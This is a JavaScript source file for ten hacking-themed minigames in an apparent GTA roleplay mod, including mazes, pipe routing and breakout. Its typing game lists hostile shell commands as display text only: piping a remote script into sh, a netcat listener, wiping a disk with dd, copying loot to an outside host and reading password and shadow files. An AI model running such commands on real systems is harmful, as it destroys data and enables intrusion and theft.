/* Hacking minigames for Los Santos OS. Ten self-contained games drawn into one full-screen overlay (#hk), so they can run
   on top of the desktop (launched from the Command Prompt) or on their own (launched by another script through the
   StartHack export). Each game is  fn(host, level, finish)  where level is 1-5 and finish(true|false) ends it.
     LSOS_HACK.start(game, level, title) -> Promise<boolean>     game = one of LSOS_HACK.games[].id, or 'random'
   Standalone launch (client/hack.lua):  { action: 'hackStart', id, game, level, title }  ->  posts 'hackDone' { id, success }.
   The server never trusts the page for target hacks: server/hack.lua times the attempt and checks the challenge token. */
(function () {
  'use strict';
  if (/[?&]dui=1/.test(location.search)) return;

  var strings = {};
  function T(k, d) { return (window.LSOS && window.LSOS.t ? window.LSOS.t(k, d) : (strings[k] || d)); }
  function rnd(n) { return Math.floor(Math.random() * n); }
  function pick(a) { return a[rnd(a.length)]; }
  function lvl(level, arr) { return arr[Math.max(0, Math.min(arr.length - 1, level - 1))]; }
  function el(tag, cls, html) { var e = document.createElement(tag); if (cls) e.className = cls; if (html != null) e.innerHTML = html; return e; }
  function shuffle(a) { for (var i = a.length - 1; i > 0; i--) { var j = rnd(i + 1), t = a[i]; a[i] = a[j]; a[j] = t; } return a; }

  // ---- shell -----------------------------------------------------------------------------------------------------
  var shell = null, session = null;

  function build() {
    shell = el('div', '');
    shell.id = 'hk';
    shell.innerHTML = '<div class="hk-panel"><div class="hk-head"><b class="hk-title"></b><span class="hk-info"></span><button class="hk-abort" type="button"></button></div><div class="hk-host"></div><div class="hk-result"></div></div>';
    document.body.appendChild(shell);
    shell.querySelector('.hk-abort').addEventListener('click', function () { if (session) session.end(false); });
  }

  /* One running game: owns the timers, key handlers and the result banner, and cleans them all up in end(). */
  function Session(def, level, title, resolve) {
    var self = this;
    this.timers = []; this.raf = 0; this.keys = []; this.over = false; this.startedAt = Date.now();
    this.host = shell.querySelector('.hk-host');
    this.host.innerHTML = '';
    shell.querySelector('.hk-title').textContent = title || def.name;
    shell.querySelector('.hk-abort').textContent = T('hk_abort', 'Abort');
    shell.querySelector('.hk-result').className = 'hk-result';
    shell.querySelector('.hk-result').textContent = '';
    this.info = shell.querySelector('.hk-info');
    this.info.textContent = '';
    shell.classList.add('open');

    this.after = function (ms, fn) { var t = setTimeout(function () { if (!self.over) fn(); }, ms); self.timers.push(t); return t; };
    this.every = function (ms, fn) { var t = setInterval(function () { if (!self.over) fn(); }, ms); self.timers.push(t); return t; };
    this.frame = function (fn) {
      var last = performance.now();
      (function loop(now) {
        if (self.over) return;
        var dt = Math.min(0.05, (now - last) / 1000); last = now;
        fn(dt);
        self.raf = requestAnimationFrame(loop);
      })(last);
    };
    this.key = function (fn) {
      var h = function (e) {
        if (e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); return self.end(false); }
        var used = fn(e);
        if (used !== false) { e.preventDefault(); e.stopPropagation(); }
      };
      window.addEventListener('keydown', h, true);
      self.keys.push(h);
    };
    this.setInfo = function (txt) { self.info.textContent = txt; };
    // Escape always aborts, even in games that take no keyboard input
    var esc = function (e) { if (e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); self.end(false); } };
    window.addEventListener('keydown', esc, true);
    this.keys.push(esc);
    this.end = function (ok) {
      if (self.over) return;
      self.over = true;
      self.timers.forEach(function (t) { clearTimeout(t); clearInterval(t); });
      cancelAnimationFrame(self.raf);
      self.keys.forEach(function (h) { window.removeEventListener('keydown', h, true); });
      var r = shell.querySelector('.hk-result');
      r.textContent = ok ? T('hk_granted', 'ACCESS GRANTED') : T('hk_denied', 'ACCESS DENIED');
      r.className = 'hk-result show ' + (ok ? 'ok' : 'bad');
      setTimeout(function () {
        if (session === self) { session = null; shell.classList.remove('open'); }
        resolve(ok);
      }, 1100);
    };
  }

  // ---- games -----------------------------------------------------------------------------------------------------
  var GAMES = [];
  function game(id, name, desc, fn) { GAMES.push({ id: id, name: name, desc: desc, fn: fn }); }

  function canvas(host, w, h) {
    var c = el('canvas', 'hk-canvas'); c.width = w; c.height = h; host.appendChild(c);
    return c.getContext('2d');
  }
  function mouseOn(ctx, fn) {
    ctx.canvas.addEventListener('mousedown', function (e) {
      var r = ctx.canvas.getBoundingClientRect();
      fn((e.clientX - r.left) * ctx.canvas.width / r.width, (e.clientY - r.top) * ctx.canvas.height / r.height, e);
    });
  }
  function mouseMove(ctx, fn) {
    ctx.canvas.addEventListener('mousemove', function (e) {
      var r = ctx.canvas.getBoundingClientRect();
      fn((e.clientX - r.left) * ctx.canvas.width / r.width, (e.clientY - r.top) * ctx.canvas.height / r.height);
    });
  }
  var C = { bg: '#04110b', fg: '#33ff99', dim: '#116644', bad: '#ff4d5e', warn: '#ffc233', cyan: '#37d7ff' };

  /* 1. Network Maze: walk from the start node to the exit before the trace finishes. */
  game('maze', 'Network Maze', 'Find the way through the network before the trace completes.', function (S, level, finish) {
    var n = lvl(level, [9, 11, 15, 19, 23]), secs = lvl(level, [50, 55, 60, 65, 70]);
    var cell = Math.floor(560 / n), size = cell * n, ctx = canvas(S.host, size, size);
    var g = []; for (var y = 0; y < n; y++) { g[y] = []; for (var x = 0; x < n; x++) g[y][x] = { v: false, w: [true, true, true, true] }; } // walls: 0 up 1 right 2 down 3 left
    var DX = [0, 1, 0, -1], DY = [-1, 0, 1, 0], stack = [[0, 0]]; g[0][0].v = true;
    while (stack.length) {
      var cur = stack[stack.length - 1], opts = [];
      for (var d = 0; d < 4; d++) { var nx = cur[0] + DX[d], ny = cur[1] + DY[d]; if (nx >= 0 && ny >= 0 && nx < n && ny < n && !g[ny][nx].v) opts.push(d); }
      if (!opts.length) { stack.pop(); continue; }
      var dd = pick(opts), tx = cur[0] + DX[dd], ty = cur[1] + DY[dd];
      g[cur[1]][cur[0]].w[dd] = false; g[ty][tx].v = true; g[ty][tx].w[(dd + 2) % 4] = false; stack.push([tx, ty]);
    }
    var p = { x: 0, y: 0 }, left = secs;
    function draw() {
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, size, size);
      ctx.strokeStyle = C.dim; ctx.lineWidth = 2;
      for (var y = 0; y < n; y++) for (var x = 0; x < n; x++) {
        var w = g[y][x].w, px = x * cell, py = y * cell; ctx.beginPath();
        if (w[0]) { ctx.moveTo(px, py); ctx.lineTo(px + cell, py); } if (w[1]) { ctx.moveTo(px + cell, py); ctx.lineTo(px + cell, py + cell); }
        if (w[2]) { ctx.moveTo(px, py + cell); ctx.lineTo(px + cell, py + cell); } if (w[3]) { ctx.moveTo(px, py); ctx.lineTo(px, py + cell); } ctx.stroke();
      }
      ctx.fillStyle = C.warn; ctx.fillRect((n - 1) * cell + cell * .25, (n - 1) * cell + cell * .25, cell * .5, cell * .5);
      ctx.fillStyle = C.fg; ctx.beginPath(); ctx.arc(p.x * cell + cell / 2, p.y * cell + cell / 2, cell * .28, 0, 7); ctx.fill();
    }
    var MAP = { ArrowUp: 0, w: 0, W: 0, ArrowRight: 1, d: 1, D: 1, ArrowDown: 2, s: 2, S: 2, ArrowLeft: 3, a: 3, A: 3 };
    S.key(function (e) {
      var d = MAP[e.key]; if (d == null) return false;
      if (!g[p.y][p.x].w[d]) { p.x += DX[d]; p.y += DY[d]; draw(); if (p.x === n - 1 && p.y === n - 1) finish(true); }
    });
    S.every(1000, function () { left--; S.setInfo(T('hk_trace', 'Trace') + ' ' + left + 's'); if (left <= 0) finish(false); });
    S.setInfo(T('hk_trace', 'Trace') + ' ' + left + 's'); draw();
  });

  /* 2. Node Capture: click each node while it is exposed; too many missed nodes and the trace wins. */
  game('capture', 'Node Capture', 'Click nodes the moment they open up. Do not let them slip away.', function (S, level, finish) {
    var goal = lvl(level, [8, 11, 14, 17, 20]), life = lvl(level, [1900, 1600, 1350, 1150, 950]), gap = lvl(level, [800, 680, 560, 470, 400]), maxMiss = 4;
    var W = 640, H = 420, ctx = canvas(S.host, W, H), nodes = [], got = 0, miss = 0, cols = 6, rows = 4;
    for (var i = 0; i < cols * rows; i++) nodes.push({ x: 60 + (i % cols) * 104, y: 62 + Math.floor(i / cols) * 98, t: 0 });
    function spawn() {
      var free = nodes.filter(function (n) { return !n.t; }); if (!free.length) return;
      var n = pick(free); n.t = life; n.max = life;
    }
    mouseOn(ctx, function (mx, my) {
      for (var i = 0; i < nodes.length; i++) { var n = nodes[i]; if (n.t > 0 && Math.hypot(mx - n.x, my - n.y) < 36) { n.t = 0; got++; if (got >= goal) finish(true); return; } }
    });
    var sinceSpawn = 0;
    S.frame(function (dt) {
      sinceSpawn += dt * 1000; if (sinceSpawn >= gap) { sinceSpawn = 0; spawn(); }
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, W, H);
      nodes.forEach(function (n) {
        if (n.t > 0) { n.t -= dt * 1000; if (n.t <= 0) { n.t = 0; miss++; if (miss >= maxMiss) finish(false); } }
        ctx.strokeStyle = n.t > 0 ? C.fg : C.dim; ctx.lineWidth = 3; ctx.beginPath(); ctx.arc(n.x, n.y, 30, 0, 7); ctx.stroke();
        if (n.t > 0) { ctx.fillStyle = 'rgba(51,255,153,.25)'; ctx.beginPath(); ctx.moveTo(n.x, n.y); ctx.arc(n.x, n.y, 30, -1.57, -1.57 + 6.283 * n.t / n.max); ctx.fill(); }
      });
      S.setInfo(T('hk_captured', 'Captured') + ' ' + got + '/' + goal + '  ·  ' + T('hk_missed', 'Missed') + ' ' + miss + '/' + maxMiss);
    });
  });

  /* 3. Cipher Lock: crack the code. After each guess you see how many symbols are right and in place, and right but misplaced. */
  game('cipher', 'Cipher Lock', 'Crack the code. Green = right place, amber = right symbol, wrong place.', function (S, level, finish) {
    var len = lvl(level, [3, 4, 4, 5, 5]), tries = lvl(level, [9, 9, 8, 9, 8]), SYM = '0123456789ABCDEF'.split('').slice(0, lvl(level, [6, 8, 10, 12, 16]));
    var code = []; for (var i = 0; i < len; i++) code.push(pick(SYM));
    var cur = '', hist = [], box = el('div', 'hk-cipher'); S.host.appendChild(box);
    function score(guess) {
      var ex = 0, mis = 0, cc = {}, gc = {};
      for (var i = 0; i < len; i++) { if (guess[i] === code[i]) ex++; else { cc[code[i]] = (cc[code[i]] || 0) + 1; gc[guess[i]] = (gc[guess[i]] || 0) + 1; } }
      for (var k in gc) if (cc[k]) mis += Math.min(cc[k], gc[k]);
      return [ex, mis];
    }
    function draw() {
      var h = '<div class="hk-note">' + T('hk_symbols', 'Symbols') + ': ' + SYM.join(' ') + '</div>';
      hist.forEach(function (r) { h += '<div class="hk-row"><span class="hk-code">' + r.g + '</span><span class="hk-ok">' + r.s[0] + '</span><span class="hk-warn">' + r.s[1] + '</span></div>'; });
      h += '<div class="hk-row"><span class="hk-code cur">' + (cur + '_'.repeat(len - cur.length)) + '</span></div>';
      box.innerHTML = h; S.setInfo(T('hk_tries', 'Tries left') + ' ' + (tries - hist.length));
    }
    S.key(function (e) {
      var k = e.key.length === 1 ? e.key.toUpperCase() : e.key;
      if (k === 'Backspace') { cur = cur.slice(0, -1); return draw(); }
      if (k === 'Enter') {
        if (cur.length < len) return;
        var s = score(cur.split('')); hist.push({ g: cur, s: s }); cur = '';
        if (s[0] === len) return finish(true);
        if (hist.length >= tries) return finish(false);
        return draw();
      }
      if (cur.length < len && SYM.indexOf(k) >= 0) { cur += k; draw(); } else return false;
    });
    draw();
  });

  /* 4. Data Worm: collect the packets without hitting the wall or yourself. */
  game('snake', 'Data Worm', 'Steer the worm to every packet. Do not touch the walls or yourself.', function (S, level, finish) {
    var cells = 20, cs = 24, W = cells * cs, ctx = canvas(S.host, W, W), goal = lvl(level, [6, 8, 10, 12, 15]), speed = lvl(level, [0.15, 0.13, 0.115, 0.1, 0.085]);
    var body = [{ x: 4, y: 10 }, { x: 3, y: 10 }, { x: 2, y: 10 }], dir = { x: 1, y: 0 }, next = dir, food, got = 0, acc = 0;
    function place() { do { food = { x: rnd(cells), y: rnd(cells) }; } while (body.some(function (b) { return b.x === food.x && b.y === food.y; })); }
    place();
    S.key(function (e) {
      var m = { ArrowUp: [0, -1], w: [0, -1], ArrowDown: [0, 1], s: [0, 1], ArrowLeft: [-1, 0], a: [-1, 0], ArrowRight: [1, 0], d: [1, 0] }[e.key];
      if (!m) return false;
      if (m[0] !== -dir.x || m[1] !== -dir.y) next = { x: m[0], y: m[1] };
    });
    S.frame(function (dt) {
      acc += dt;
      if (acc >= speed) {
        acc = 0; dir = next; var h = { x: body[0].x + dir.x, y: body[0].y + dir.y };
        if (h.x < 0 || h.y < 0 || h.x >= cells || h.y >= cells || body.some(function (b) { return b.x === h.x && b.y === h.y; })) return finish(false);
        body.unshift(h);
        if (h.x === food.x && h.y === food.y) { got++; if (got >= goal) return finish(true); place(); } else body.pop();
      }
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, W, W);
      ctx.fillStyle = C.warn; ctx.fillRect(food.x * cs + 4, food.y * cs + 4, cs - 8, cs - 8);
      body.forEach(function (b, i) { ctx.fillStyle = i ? C.fg : '#b8ffe0'; ctx.fillRect(b.x * cs + 1, b.y * cs + 1, cs - 2, cs - 2); });
      S.setInfo(T('hk_packets', 'Packets') + ' ' + got + '/' + goal);
    });
  });

  /* 5. Firewall Defense: click the intruders before they reach the wall. */
  game('firewall', 'Firewall Defense', 'Click intruders before they reach the firewall. Hold it until the scan ends.', function (S, level, finish) {
    var W = 640, H = 440, ctx = canvas(S.host, W, H), hp = lvl(level, [8, 7, 6, 5, 5]), total = lvl(level, [22, 26, 30, 34, 38]), gap = lvl(level, [1.0, .85, .7, .6, .5]), spd = lvl(level, [55, 70, 85, 100, 120]);
    var foes = [], spawned = 0, killed = 0, t = 0, down = 0;
    mouseOn(ctx, function (mx, my) {
      for (var i = foes.length - 1; i >= 0; i--) { var f = foes[i]; if (Math.hypot(mx - f.x, my - f.y) < 26) { foes.splice(i, 1); killed++; return; } }
    });
    S.frame(function (dt) {
      t += dt;
      if (spawned < total && t >= spawned * gap) { foes.push({ x: 40 + rnd(W - 80), y: -20, v: spd * (0.8 + Math.random() * 0.5) }); spawned++; }
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = C.cyan; ctx.fillRect(0, H - 34, W, 6);
      for (var i = foes.length - 1; i >= 0; i--) {
        var f = foes[i]; f.y += f.v * dt;
        if (f.y > H - 34) { foes.splice(i, 1); hp--; down++; if (hp <= 0) return finish(false); continue; }
        ctx.fillStyle = C.bad; ctx.beginPath(); ctx.moveTo(f.x, f.y + 16); ctx.lineTo(f.x - 15, f.y - 12); ctx.lineTo(f.x + 15, f.y - 12); ctx.closePath(); ctx.fill();
      }
      if (spawned >= total && !foes.length) return finish(true);
      S.setInfo(T('hk_integrity', 'Integrity') + ' ' + hp + '  ·  ' + T('hk_blocked', 'Blocked') + ' ' + killed + '/' + total);
    });
  });

  /* 6. Highway Evasion: slide between lanes and dodge the traffic until the clock runs out. */
  game('evasion', 'Highway Evasion', 'Switch lanes to dodge the traffic until the trace is shaken.', function (S, level, finish) {
    var lanes = 5, lw = 70, W = lanes * lw + 20, H = 460, ctx = canvas(S.host, W, H), secs = lvl(level, [18, 22, 26, 30, 34]), gap = lvl(level, [.62, .52, .44, .38, .32]), spd = lvl(level, [220, 260, 300, 340, 390]);
    var lane = 2, cars = [], t = 0, spawnT = 0, scroll = 0;
    S.key(function (e) {
      if (e.key === 'ArrowLeft' || e.key === 'a' || e.key === 'A') lane = Math.max(0, lane - 1);
      else if (e.key === 'ArrowRight' || e.key === 'd' || e.key === 'D') lane = Math.min(lanes - 1, lane + 1);
      else return false;
    });
    S.frame(function (dt) {
      t += dt; spawnT += dt; scroll = (scroll + spd * dt) % 40;
      if (spawnT >= gap) { spawnT = 0; var free = rnd(lanes); for (var l = 0; l < lanes; l++) if (l !== free && Math.random() < .55) cars.push({ l: l, y: -50 }); }
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, W, H);
      ctx.strokeStyle = C.dim; ctx.setLineDash([16, 24]); ctx.lineDashOffset = -scroll;
      for (var i = 1; i < lanes; i++) { ctx.beginPath(); ctx.moveTo(10 + i * lw, 0); ctx.lineTo(10 + i * lw, H); ctx.stroke(); }
      ctx.setLineDash([]);
      var py = H - 80, px = 10 + lane * lw + lw / 2;
      for (var j = cars.length - 1; j >= 0; j--) {
        var c = cars[j]; c.y += spd * dt; if (c.y > H + 40) { cars.splice(j, 1); continue; }
        var cx = 10 + c.l * lw + lw / 2; ctx.fillStyle = C.bad; ctx.fillRect(cx - 18, c.y - 28, 36, 56);
        if (Math.abs(cx - px) < 30 && Math.abs(c.y - py) < 50) return finish(false);
      }
      ctx.fillStyle = C.fg; ctx.fillRect(px - 17, py - 27, 34, 54);
      var left = Math.max(0, secs - t); S.setInfo(T('hk_escape', 'Shake the trace') + ' ' + left.toFixed(1) + 's');
      if (t >= secs) finish(true);
    });
  });

  /* 7. Code Injection: type each line exactly as shown. */
  game('typing', 'Code Injection', 'Type each command exactly as shown before time runs out.', function (S, level, finish) {
    var lines = lvl(level, [4, 5, 6, 7, 8]), secs = lvl(level, [40, 40, 42, 44, 46]);
    var POOL = ['sudo rm -rf /var/log', 'chmod 777 /etc/shadow', 'nc -lvp 4444', 'ssh root@10.0.4.22', 'cat /etc/passwd | grep admin', 'iptables -F INPUT', 'curl http://c2.local/p.sh | sh',
      'systemctl stop alarmd', 'dd if=/dev/zero of=/dev/sda', 'export PATH=/tmp:$PATH', 'tar -czf dump.tgz /vault', 'wget -q 10.0.0.9/key.bin', 'kill -9 $(pidof guard)', 'echo 0 > /proc/sys/net/ipv4/ip_forward',
      'mount -o remount,rw /', 'scp loot.db user@203.0.113.5:', 'ping -c 1 192.168.1.1', 'rm ~/.bash_history', 'grep -r password /srv', 'openssl enc -d -aes256 -in data'];
    var targets = shuffle(POOL.slice()).slice(0, lines), idx = 0, typed = '', left = secs, box = el('div', 'hk-typing'); S.host.appendChild(box);
    function draw() {
      var h = '';
      targets.forEach(function (t, i) {
        if (i < idx) h += '<div class="hk-line done">' + escapeHtml(t) + '</div>';
        else if (i === idx) { var ok = 0; while (ok < typed.length && typed[ok] === t[ok]) ok++; h += '<div class="hk-line cur"><span class="good">' + escapeHtml(t.slice(0, ok)) + '</span>' + (typed.length > ok ? '<span class="wrong">' + escapeHtml(t.slice(ok, typed.length)) + '</span>' : '') + escapeHtml(t.slice(Math.max(ok, typed.length))) + '</div>'; }
        else h += '<div class="hk-line">' + escapeHtml(t) + '</div>';
      });
      box.innerHTML = h;
    }
    S.key(function (e) {
      if (e.key === 'Backspace') { typed = typed.slice(0, -1); return draw(); }
      if (e.key.length !== 1 || e.ctrlKey || e.metaKey) return false;
      typed += e.key;
      var t = targets[idx];
      if (typed === t) { idx++; typed = ''; if (idx >= lines) return finish(true); }
      draw();
    });
    S.every(1000, function () { left--; S.setInfo(left + 's  ·  ' + (idx) + '/' + lines); if (left <= 0) finish(false); });
    S.setInfo(left + 's  ·  0/' + lines); draw();
  });
  function escapeHtml(s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); }

  /* 8. Signal Replay: watch the sequence, then repeat it. */
  game('signal', 'Signal Replay', 'Watch the signal, then repeat it back in the same order.', function (S, level, finish) {
    var rounds = lvl(level, [4, 5, 6, 7, 8]), speed = lvl(level, [620, 540, 470, 410, 360]);
    var box = el('div', 'hk-signal'), pads = [], seq = [], at = 0, accepting = false, round = 0;
    var COL = ['#33ff99', '#37d7ff', '#ffc233', '#ff4d5e'];
    for (var i = 0; i < 4; i++) { (function (k) { var b = el('button', 'hk-pad', '<span>' + (k + 1) + '</span>'); b.type = 'button'; b.style.setProperty('--c', COL[k]); b.addEventListener('mousedown', function () { press(k); }); pads.push(b); box.appendChild(b); })(i); }
    S.host.appendChild(box);
    function flash(k, ms) { pads[k].classList.add('lit'); S.after(ms, function () { pads[k].classList.remove('lit'); }); }
    function play() {
      accepting = false; at = 0; seq.push(rnd(4)); round++; S.setInfo(T('hk_round', 'Round') + ' ' + round + '/' + rounds);
      seq.forEach(function (k, i) { S.after(500 + i * speed, function () { flash(k, speed * .6); }); });
      S.after(500 + seq.length * speed, function () { accepting = true; });
    }
    function press(k) {
      if (!accepting) return; flash(k, 160);
      if (k !== seq[at]) return finish(false);
      at++;
      if (at >= seq.length) { accepting = false; if (round >= rounds) return finish(true); S.after(600, play); }
    }
    S.key(function (e) { var k = '1234'.indexOf(e.key); if (k < 0) return false; press(k); });
    play();
  });

  /* 9. Packet Routing: rotate the pipe tiles until the packet can travel from the source to the sink. */
  game('pipe', 'Packet Routing', 'Rotate the tiles (click) to connect the source to the sink.', function (S, level, finish) {
    var n = lvl(level, [4, 5, 5, 6, 7]), cell = Math.floor(440 / n), size = cell * n, ctx = canvas(S.host, size, size);
    // A tile is a 4-bit mask of open sides: 1 up, 2 right, 4 down, 8 left. The source feeds the left side of the top-left
    // tile and the sink is the right side of the bottom-right tile. A random self-avoiding path between them is the solution.
    var DX = [0, 1, 0, -1], DY = [-1, 0, 1, 0], x, y;
    function findPath() {
      var path = [[0, 0]], seen = {}; seen['0,0'] = true;
      (function dfs() {
        var cur = path[path.length - 1];
        if (cur[0] === n - 1 && cur[1] === n - 1) return true;
        var ds = shuffle([0, 1, 2, 3]);
        for (var k = 0; k < 4; k++) {
          var d = ds[k], nx = cur[0] + DX[d], ny = cur[1] + DY[d];
          if (nx < 0 || ny < 0 || nx >= n || ny >= n || seen[nx + ',' + ny]) continue;
          seen[nx + ',' + ny] = true; path.push([nx, ny]);
          if (dfs()) return true;
          path.pop();
        }
        return false;
      })();
      return path;
    }
    var path = findPath(), mask = [], tiles = [];
    for (y = 0; y < n; y++) { mask[y] = []; for (x = 0; x < n; x++) mask[y][x] = 0; }
    for (var i = 0; i + 1 < path.length; i++) {
      var a = path[i], b = path[i + 1];
      var d;
      if (b[1] === a[1]) d = b[0] > a[0] ? 1 : 3; else d = b[1] > a[1] ? 2 : 0;
      mask[a[1]][a[0]] |= (1 << d); mask[b[1]][b[0]] |= (1 << ((d + 2) % 4));
    }
    mask[0][0] |= 8; mask[n - 1][n - 1] |= 2;
    var onPath = {}; path.forEach(function (c) { onPath[c[0] + ',' + c[1]] = true; });
    for (y = 0; y < n; y++) { tiles[y] = []; for (x = 0; x < n; x++) {
      if (!onPath[x + ',' + y]) mask[y][x] = pick([0, 5, 10, 3, 6, 12, 9, 7, 11, 13, 14]);   // decoys: lines, corners, tees
      tiles[y][x] = mask[y][x];
    } }
    function rot(m) { return ((m << 1) | (m >> 3)) & 15; }
    function lit() {
      var on = {}, q = [];
      if (tiles[0][0] & 8) { on['0,0'] = true; q.push([0, 0]); }
      while (q.length) {
        var c = q.shift();
        for (var d = 0; d < 4; d++) {
          if (!(tiles[c[1]][c[0]] & (1 << d))) continue;
          var nx = c[0] + DX[d], ny = c[1] + DY[d];
          if (nx < 0 || ny < 0 || nx >= n || ny >= n || on[nx + ',' + ny]) continue;
          if (tiles[ny][nx] & (1 << ((d + 2) % 4))) { on[nx + ',' + ny] = true; q.push([nx, ny]); }
        }
      }
      return on;
    }
    function won() { return !!(lit()[(n - 1) + ',' + (n - 1)] && (tiles[n - 1][n - 1] & 2)); }
    for (var t = 0; t < 40; t++) { for (y = 0; y < n; y++) for (x = 0; x < n; x++) { var r = rnd(4); while (r--) tiles[y][x] = rot(tiles[y][x]); } if (!won()) break; }
    function draw() {
      var on = lit();
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, size, size);
      for (var y = 0; y < n; y++) for (var x = 0; x < n; x++) {
        var m = tiles[y][x], cx = x * cell + cell / 2, cy = y * cell + cell / 2, h = cell / 2;
        ctx.strokeStyle = 'rgba(17,102,68,.5)'; ctx.lineWidth = 1; ctx.strokeRect(x * cell, y * cell, cell, cell);
        ctx.strokeStyle = on[x + ',' + y] ? C.fg : C.dim; ctx.lineWidth = Math.max(4, cell * .14); ctx.lineCap = 'round';
        for (var d = 0; d < 4; d++) if (m & (1 << d)) { ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(cx + DX[d] * h, cy + DY[d] * h); ctx.stroke(); }
      }
      ctx.fillStyle = C.warn; ctx.fillRect(0, 0, 6, cell); ctx.fillStyle = C.cyan; ctx.fillRect(size - 6, size - cell, 6, cell);
    }
    mouseOn(ctx, function (mx, my) {
      var x = Math.floor(mx / cell), y = Math.floor(my / cell); if (x < 0 || y < 0 || x >= n || y >= n) return;
      tiles[y][x] = rot(tiles[y][x]); draw(); if (won()) finish(true);
    });
    var left = lvl(level, [75, 80, 85, 90, 95]);
    S.every(1000, function () { left--; S.setInfo(left + 's'); if (left <= 0) finish(false); });
    S.setInfo(left + 's'); draw();
  });

  /* 10. ICE Breaker: bounce the packet off the paddle and break every ICE block. */
  game('breakout', 'ICE Breaker', 'Break all the ICE blocks. Move the paddle with the mouse or the arrow keys.', function (S, level, finish) {
    var W = 560, H = 440, ctx = canvas(S.host, W, H), rows = lvl(level, [3, 4, 5, 5, 6]), cols = 10, bw = W / cols, bh = 22, lives = lvl(level, [4, 3, 3, 3, 2]), sp = lvl(level, [300, 340, 380, 420, 460]);
    var bricks = []; for (var r = 0; r < rows; r++) for (var c = 0; c < cols; c++) bricks.push({ x: c * bw, y: 40 + r * bh, hp: r < Math.floor(level / 2) ? 2 : 1 });
    var pad = { x: W / 2, w: lvl(level, [110, 100, 90, 80, 70]), dir: 0 }, ball = { x: W / 2, y: H - 60, vx: 0, vy: 0, stuck: true };
    function launch() { if (ball.stuck) { ball.stuck = false; var a = (-0.5 + Math.random()) * 0.8; ball.vx = Math.sin(a) * sp; ball.vy = -Math.cos(a) * sp; } }
    mouseMove(ctx, function (mx) { pad.x = Math.max(pad.w / 2, Math.min(W - pad.w / 2, mx)); });
    mouseOn(ctx, launch);
    S.key(function (e) {
      if (e.key === 'ArrowLeft' || e.key === 'a') pad.x = Math.max(pad.w / 2, pad.x - 28);
      else if (e.key === 'ArrowRight' || e.key === 'd') pad.x = Math.min(W - pad.w / 2, pad.x + 28);
      else if (e.key === ' ' || e.key === 'ArrowUp') launch(); else return false;
    });
    S.frame(function (dt) {
      if (ball.stuck) { ball.x = pad.x; ball.y = H - 50; }
      else {
        ball.x += ball.vx * dt; ball.y += ball.vy * dt;
        if (ball.x < 6) { ball.x = 6; ball.vx = Math.abs(ball.vx); } if (ball.x > W - 6) { ball.x = W - 6; ball.vx = -Math.abs(ball.vx); } if (ball.y < 6) { ball.y = 6; ball.vy = Math.abs(ball.vy); }
        if (ball.vy > 0 && ball.y > H - 40 && ball.y < H - 26 && Math.abs(ball.x - pad.x) < pad.w / 2 + 6) {
          var off = (ball.x - pad.x) / (pad.w / 2); var a2 = off * 1.1; ball.vx = Math.sin(a2) * sp; ball.vy = -Math.cos(a2) * sp;
        }
        if (ball.y > H + 10) { lives--; if (lives <= 0) return finish(false); ball.stuck = true; }
        for (var i = 0; i < bricks.length; i++) {
          var b = bricks[i]; if (ball.x > b.x && ball.x < b.x + bw && ball.y > b.y && ball.y < b.y + bh) {
            b.hp--; ball.vy = -ball.vy; if (b.hp <= 0) bricks.splice(i, 1); break;
          }
        }
        if (!bricks.length) return finish(true);
      }
      ctx.fillStyle = C.bg; ctx.fillRect(0, 0, W, H);
      bricks.forEach(function (b) { ctx.fillStyle = b.hp > 1 ? C.cyan : C.fg; ctx.fillRect(b.x + 2, b.y + 2, bw - 4, bh - 4); });
      ctx.fillStyle = C.warn; ctx.fillRect(pad.x - pad.w / 2, H - 30, pad.w, 8);
      ctx.fillStyle = '#fff'; ctx.beginPath(); ctx.arc(ball.x, ball.y, 6, 0, 7); ctx.fill();
      S.setInfo(T('hk_lives', 'Lives') + ' ' + lives + '  ·  ' + T('hk_blocks', 'Blocks') + ' ' + bricks.length + (ball.stuck ? '  ·  ' + T('hk_launch', 'Click or Space to launch') : ''));
    });
  });

  // ---- public ----------------------------------------------------------------------------------------------------
  function start(id, level, title) {
    if (!shell) build();
    return new Promise(function (resolve) {
      if (session) session.end(false);
      var def = GAMES.filter(function (g) { return g.id === id; })[0] || pick(GAMES);
      level = Math.max(1, Math.min(5, Math.floor(Number(level) || 2)));
      var s = new Session(def, level, title, resolve);
      session = s;
      try { def.fn(s, level, function (ok) { s.end(!!ok); }); }
      catch (err) { console.error('[as-computer] hack game failed', err); s.end(false); }
    });
  }

  window.LSOS_HACK = {
    games: GAMES.map(function (g) { return { id: g.id, name: g.name, desc: g.desc }; }),
    start: start,
    running: function () { return !!session; }
  };

  function post(path, body) {
    return fetch('https://' + (window.GetParentResourceName ? window.GetParentResourceName() : 'as-computer') + '/' + path, {
      method: 'POST', headers: { 'Content-Type': 'application/json; charset=UTF-8' }, body: JSON.stringify(body || {})
    }).catch(function () {});
  }
  window.addEventListener('message', function (e) {
    var d = e.data || {};
    if (d.action === 'hackStart') {
      strings = d.strings || strings;
      start(d.game, d.level, d.title).then(function (ok) { post('hackDone', { id: d.id, success: ok }); });
    } else if (d.action === 'hackAbort' && session) session.end(false);
  });
})();
